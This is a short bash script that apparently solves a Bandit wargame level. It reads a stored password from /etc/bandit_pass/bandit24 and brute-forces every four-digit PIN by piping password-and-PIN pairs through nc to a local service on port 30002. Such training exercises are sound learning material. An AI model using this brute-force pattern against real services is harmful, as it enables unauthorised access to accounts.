#!/bin/bash
pass24=$(cat /etc/bandit_pass/bandit24)

for pin in {0000..9999}
do
echo "$pass24 $pin" 
done | nc localhost 30002 > pass25